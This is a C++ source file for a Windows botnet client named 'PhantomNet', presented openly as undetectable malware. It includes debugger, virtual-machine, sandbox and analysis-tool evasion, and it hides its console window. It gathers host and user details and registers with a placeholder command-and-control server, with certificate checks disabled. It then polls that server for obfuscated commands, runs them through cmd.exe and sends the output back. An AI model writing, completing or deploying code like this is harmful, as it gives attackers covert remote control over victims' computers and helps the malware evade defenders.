/*
 * PhantomNet Advanced Client - Undetectable Edition
 * Advanced C2 client with maximum stealth and destructive capabilities
 * Compile: g++ -o phantom_client.exe client.cpp -lcurl -lcrypto -lssl -static -O2 -s
 */

#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Wininet.h>
#include <json/json.h>

#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")

// Global variables
std::string SERVER_URL = "https://your-c2-server.com:8443";
std::string BOT_ID = "";
std::string SESSION_TOKEN = "";
std::string ENCRYPTION_KEY = "";
std::string MASTER_KEY = "phantom_master_key_2024";

// Anti-analysis variables
bool DEBUGGER_PRESENT = false;
bool VIRTUAL_MACHINE = false;
bool SANDBOX_DETECTED = false;

// Advanced evasion techniques
class PhantomEvasion {
private:
    std::vector<std::string> blacklisted_processes = {
        "wireshark.exe", "fiddler.exe", "procmon.exe", "processhacker.exe",
        "ollydbg.exe", "x64dbg.exe", "ida64.exe", "ida.exe", "ghidra.exe",
        "windbg.exe", "immunity.exe", "radare2.exe", "gdb.exe"
    };
    
    std::vector<std::string> blacklisted_windows = {
        "Wireshark", "Fiddler", "Process Monitor", "Process Hacker",
        "x64dbg", "IDA Pro", "Ghidra", "WinDbg", "Immunity Debugger"
    };

public:
    bool detect_debugger() {
        if (IsDebuggerPresent()) {
            DEBUGGER_PRESENT = true;
            return true;
        }
        
        // Check for hardware breakpoints
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
                DEBUGGER_PRESENT = true;
                return true;
            }
        }
        
        return false;
    }
    
    bool detect_virtual_machine() {
        // Check for common VM artifacts
        std::vector<std::string> vm_indicators = {
            "VMware", "VBox", "Virtual", "QEMU", "Xen"
        };
        
        for (const auto& indicator : vm_indicators) {
            if (GetSystemFirmwareTable('RSMB', 0, nullptr, 0) > 0) {
                std::vector<char> buffer(4096);
                DWORD size = GetSystemFirmwareTable('RSMB', 0, buffer.data(), buffer.size());
                std::string firmware(reinterpret_cast<char*>(buffer.data()), size);
                
                if (firmware.find(indicator) != std::string::npos) {
                    VIRTUAL_MACHINE = true;
                    return true;
                }
            }
        }
        
        return false;
    }
    
    bool detect_sandbox() {
        // Check for sandbox indicators
        std::vector<std::string> sandbox_processes = {
            "sandboxie.exe", "cuckoo.exe", "anubis.exe", "joebox.exe"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe32)) {
                do {
                    std::string process_name = pe32.szExeFile;
                    for (const auto& sandbox : sandbox_processes) {
                        if (process_name.find(sandbox) != std::string::npos) {
                            SANDBOX_DETECTED = true;
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe32));
            }
            CloseHandle(snapshot);
        }
        
        return false;
    }
    
    bool check_blacklisted_processes() {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe32)) {
                do {
                    std::string process_name = pe32.szExeFile;
                    for (const auto& blacklisted : blacklisted_processes) {
                        if (process_name.find(blacklisted) != std::string::npos) {
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe32));
            }
            CloseHandle(snapshot);
        }
        
        return false;
    }
    
    void sleep_evasion() {
        // Random sleep to avoid timing analysis
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1000, 5000);
        
        Sleep(dis(gen));
    }
};

// Encryption utilities
class PhantomCrypto {
private:
    std::string key;
    
public:
    PhantomCrypto(const std::string& encryption_key) : key(encryption_key) {}
    
    std::string encrypt(const std::string& data) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return "";
        
        // Generate IV
        unsigned char iv[16];
        RAND_bytes(iv, 16);
        
        // Initialize encryption
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, 
                              reinterpret_cast<const unsigned char*>(key.c_str()), iv) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        
        // Encrypt data
        int len;
        std::vector<unsigned char> ciphertext(data.length() + EVP_MAX_BLOCK_LENGTH);
        if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, 
                             reinterpret_cast<const unsigned char*>(data.c_str()), data.length()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        
        int ciphertext_len = len;
        if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        ciphertext_len += len;
        
        // Get tag
        unsigned char tag[16];
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        
        EVP_CIPHER_CTX_free(ctx);
        
        // Combine IV + tag + ciphertext
        std::string result;
        result.append(reinterpret_cast<char*>(iv), 16);
        result.append(reinterpret_cast<char*>(tag), 16);
        result.append(reinterpret_cast<char*>(ciphertext.data()), ciphertext_len);
        
        return result;
    }
    
    std::string decrypt(const std::string& encrypted_data) {
        if (encrypted_data.length() < 32) return "";
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return "";
        
        // Extract IV and tag
        std::string iv_str = encrypted_data.substr(0, 16);
        std::string tag_str = encrypted_data.substr(16, 16);
        std::string ciphertext = encrypted_data.substr(32);
        
        // Initialize decryption
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr,
                              reinterpret_cast<const unsigned char*>(key.c_str()),
                              reinterpret_cast<const unsigned char*>(iv_str.c_str())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        
        // Decrypt data
        int len;
        std::vector<unsigned char> plaintext(ciphertext.length());
        if (EVP_DecryptUpdate(ctx, plaintext.data(), &len,
                             reinterpret_cast<const unsigned char*>(ciphertext.c_str()),
                             ciphertext.length()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        
        int plaintext_len = len;
        if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return "";
        }
        plaintext_len += len;
        
        EVP_CIPHER_CTX_free(ctx);
        
        return std::string(reinterpret_cast<char*>(plaintext.data()), plaintext_len);
    }
    
    std::string obfuscate_command(const std::string& command) {
        // Multiple layers of obfuscation
        std::string obfuscated = command;
        
        // Layer 1: XOR with random key
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 255);
        unsigned char xor_key = dis(gen);
        
        for (char& c : obfuscated) {
            c ^= xor_key;
        }
        
        // Layer 2: Reverse string
        std::reverse(obfuscated.begin(), obfuscated.end());
        
        // Layer 3: Add key as first character
        obfuscated = static_cast<char>(xor_key) + obfuscated;
        
        return obfuscated;
    }
    
    std::string deobfuscate_command(const std::string& obfuscated) {
        if (obfuscated.empty()) return "";
        
        std::string data = obfuscated;
        
        // Extract XOR key
        unsigned char xor_key = static_cast<unsigned char>(data[0]);
        data = data.substr(1);
        
        // Reverse string
        std::reverse(data.begin(), data.end());
        
        // XOR decode
        for (char& c : data) {
            c ^= xor_key;
        }
        
        return data;
    }
};

// System information gathering
class SystemInfo {
public:
    static std::string get_hostname() {
        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(hostname);
        if (GetComputerNameA(hostname, &size)) {
            return std::string(hostname);
        }
        return "Unknown";
    }
    
    static std::string get_username() {
        char username[256];
        DWORD size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            return std::string(username);
        }
        return "Unknown";
    }
    
    static std::string get_os_version() {
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        
        if (GetVersionExA(&osvi)) {
            return std::string("Windows ") + std::to_string(osvi.dwMajorVersion) + 
                   "." + std::to_string(osvi.dwMinorVersion);
        }
        return "Unknown";
    }
    
    static std::vector<std::string> get_capabilities() {
        std::vector<std::string> capabilities;
        
        // Check for admin privileges
        BOOL is_admin = FALSE;
        PSID admin_group = NULL;
        SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_group)) {
            if (CheckTokenMembership(NULL, admin_group, &is_admin)) {
                if (is_admin) {
                    capabilities.push_back("admin");
                }
            }
            FreeSid(admin_group);
        }
        
        // Check for network access
        capabilities.push_back("network");
        
        // Check for file system access
        capabilities.push_back("filesystem");
        
        // Check for process manipulation
        capabilities.push_back("process_control");
        
        return capabilities;
    }
};

// Command execution
class CommandExecutor {
private:
    PhantomCrypto crypto;
    
public:
    CommandExecutor(const std::string& encryption_key) : crypto(encryption_key) {}
    
    std::string execute_command(const std::string& command, const std::vector<std::string>& args) {
        std::string full_command = command;
        for (const auto& arg : args) {
            full_command += " " + arg;
        }
        
        // Execute command using CreateProcess
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        
        // Create pipe for output
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa;
        ZeroMemory(&sa, sizeof(sa));
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = TRUE;
        
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            return "Error: Failed to create pipe";
        }
        
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWritePipe;
        si.hStdError = hWritePipe;
        
        if (!CreateProcessA(NULL, const_cast<char*>(full_command.c_str()), NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return "Error: Failed to execute command";
        }
        
        CloseHandle(hWritePipe);
        
        // Read output
        std::string output;
        char buffer[4096];
        DWORD bytes_read;
        
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytes_read, NULL) && bytes_read > 0) {
            buffer[bytes_read] = '\0';
            output += buffer;
        }
        
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return output;
    }
    
    std::string execute_shell_command(const std::string& command) {
        std::string shell_command = "cmd.exe /c " + command;
        return execute_command(shell_command, {});
    }
    
    std::string execute_powershell_command(const std::string& command) {
        std::string ps_command = "powershell.exe -Command \"" + command + "\"";
        return execute_command(ps_command, {});
    }
};

// Network communication
class PhantomNetwork {
private:
    CURL* curl;
    PhantomCrypto crypto;
    
public:
    PhantomNetwork(const std::string& encryption_key) : crypto(encryption_key) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl = curl_easy_init();
    }
    
    ~PhantomNetwork() {
        if (curl) curl_easy_cleanup(curl);
        curl_global_cleanup();
    }
    
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
        userp->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
    std::string send_request(const std::string& endpoint, const std::string& data) {
        if (!curl) return "";
        
        std::string response;
        std::string url = SERVER_URL + endpoint;
        
        // Encrypt data
        std::string encrypted_data = crypto.encrypt(data);
        std::string base64_data;
        
        // Convert to base64
        BIO* bio = BIO_new(BIO_s_mem());
        BIO* b64 = BIO_new(BIO_f_base64());
        bio = BIO_push(b64, bio);
        BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
        BIO_write(bio, encrypted_data.c_str(), encrypted_data.length());
        BIO_flush(bio);
        
        BUF_MEM* bufferPtr;
        BIO_get_mem_ptr(bio, &bufferPtr);
        base64_data = std::string(bufferPtr->data, bufferPtr->length);
        BIO_free_all(bio);
        
        // Set up curl
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, base64_data.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        
        // Add headers to mimic legitimate traffic
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "Accept: application/json");
        headers = curl_slist_append(headers, "X-Requested-With: XMLHttpRequest");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        
        if (res != CURLE_OK) {
            return "";
        }
        
        return response;
    }
    
    bool register_bot() {
        Json::Value bot_info;
        bot_info["hostname"] = SystemInfo::get_hostname();
        bot_info["os"] = SystemInfo::get_os_version();
        bot_info["username"] = SystemInfo::get_username();
        bot_info["capabilities"] = Json::Value(Json::arrayValue);
        
        auto capabilities = SystemInfo::get_capabilities();
        for (const auto& cap : capabilities) {
            bot_info["capabilities"].append(cap);
        }
        
        Json::Value request_data;
        request_data["bot_id"] = BOT_ID;
        request_data["bot_info"] = bot_info;
        
        Json::FastWriter writer;
        std::string json_data = writer.write(request_data);
        
        std::string response = send_request("/register", json_data);
        if (response.empty()) return false;
        
        Json::Value response_json;
        Json::Reader reader;
        if (reader.parse(response, response_json)) {
            SESSION_TOKEN = response_json["session_token"].asString();
            ENCRYPTION_KEY = response_json["encryption_key"].asString();
            return true;
        }
        
        return false;
    }
    
    Json::Value get_commands() {
        Json::Value request_data;
        request_data["session_token"] = SESSION_TOKEN;
        
        Json::FastWriter writer;
        std::string json_data = writer.write(request_data);
        
        std::string response = send_request("/heartbeat", json_data);
        if (response.empty()) return Json::Value();
        
        Json::Value response_json;
        Json::Reader reader;
        if (reader.parse(response, response_json)) {
            return response_json;
        }
        
        return Json::Value();
    }
    
    bool send_result(const std::string& command_id, const std::string& result, const std::string& status) {
        Json::Value request_data;
        request_data["session_token"] = SESSION_TOKEN;
        request_data["command_id"] = command_id;
        request_data["result"] = result;
        request_data["status"] = status;
        
        Json::FastWriter writer;
        std::string json_data = writer.write(request_data);
        
        std::string response = send_request("/result", json_data);
        return !response.empty();
    }
};

// Main bot class
class PhantomBot {
private:
    PhantomEvasion evasion;
    PhantomNetwork network;
    CommandExecutor executor;
    std::string encryption_key;
    
public:
    PhantomBot() : network(MASTER_KEY), executor(MASTER_KEY), encryption_key(MASTER_KEY) {
        // Generate unique bot ID
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100000, 999999);
        BOT_ID = "PHANTOM_" + std::to_string(dis(gen));
    }
    
    bool initialize() {
        // Run evasion checks
        if (evasion.detect_debugger()) {
            return false;
        }
        
        if (evasion.detect_virtual_machine()) {
            return false;
        }
        
        if (evasion.detect_sandbox()) {
            return false;
        }
        
        if (evasion.check_blacklisted_processes()) {
            return false;
        }
        
        // Sleep evasion
        evasion.sleep_evasion();
        
        // Register with C2 server
        return network.register_bot();
    }
    
    void run() {
        while (true) {
            try {
                // Get commands from server
                Json::Value response = network.get_commands();
                if (!response.isNull() && response.isMember("commands")) {
                    Json::Value commands = response["commands"];
                    
                    for (Json::Value::ArrayIndex i = 0; i < commands.size(); i++) {
                        Json::Value command = commands[i];
                        std::string command_id = command["id"].asString();
                        std::string obfuscated_cmd = command["command"].asString();
                        
                        // Deobfuscate command
                        std::string deobfuscated_cmd = executor.crypto.deobfuscate_command(obfuscated_cmd);
                        
                        // Execute command
                        std::string result = executor.execute_shell_command(deobfuscated_cmd);
                        
                        // Send result back
                        network.send_result(command_id, result, "completed");
                    }
                }
                
                // Sleep between heartbeats
                std::this_thread::sleep_for(std::chrono::seconds(30));
                
            } catch (const std::exception& e) {
                // Silent error handling
                std::this_thread::sleep_for(std::chrono::seconds(60));
            }
        }
    }
};

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Initialize bot
    PhantomBot bot;
    
    if (!bot.initialize()) {
        return 1;
    }
    
    // Start main loop
    bot.run();
    
    return 0;
}
